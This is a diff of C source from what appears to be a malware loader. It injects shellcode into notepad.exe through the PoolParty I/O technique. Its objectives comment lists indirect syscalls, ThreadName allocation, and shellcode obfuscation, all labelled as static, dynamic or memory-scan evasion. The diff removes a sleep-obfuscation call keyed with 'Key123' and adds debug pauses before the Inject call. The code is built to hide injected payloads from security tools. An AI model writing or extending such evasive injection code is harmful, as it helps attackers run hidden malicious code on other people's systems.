@@ -14,18 +14,18 @@
 
 extern Ade GlobalAde;
 
-// TODO: to indirect: SpawnTargetProcess, refactoring
+// TODO: to indirect: SpawnTargetProcess, refactoring, more verbose in debug
 
 /* Objectives:
-    * Inject with PoolParty I/O (starting thread) (DONE)
-    * Indirect syscalls (dynamic evasion) (DONE)
-    * ThreadName alloc (memory scan evasion) (DONE)
-    * Heap/stack encryption (memory scan evasion)
-    * Shellcode obfuscation (static evasion) (DONE)
+    * Inject with PoolParty I/O (starting thread)   (DONE)
+    * Indirect syscalls (dynamic evasion)           (DONE)
+    * ThreadName alloc (memory scan evasion)        (DONE)
+    * Shellcode obfuscation (static evasion)        (DONE)
 
     * EXTRA: impl. DLL, PE or shellcode injection 
 */
 
+#define SLEEP_OBF       1000 * 10
 #define TARGET_PROCNAME "notepad.exe"
 
 /* Conditional defines */
@@ -119,24 +119,9 @@ int main() {
     	return -1;
     }
 
-    UNICODE_STRING key;
-    RtlInitUnicodeString(
-        &key,
-        L"Key123"
-    );
-
-    if (!SleepObf(
-        hProcess,
-        memoryShellcodeAlloc.executionAddr,
-        shellcodeSize,
-        1000 * 10,
-        key
-    )) {
-        DEBUG_ERROR("FAILED SleepObf");
-        return -1;
-    }
-
     DEBUG_INFO("Execution Addr @ 0x%p", memoryShellcodeAlloc.executionAddr);
+    DEBUG_GETCHAR();
+
     Inject(hProcess, completionIoHandle, memoryShellcodeAlloc.executionAddr);
 
     DEBUG_GETCHAR();
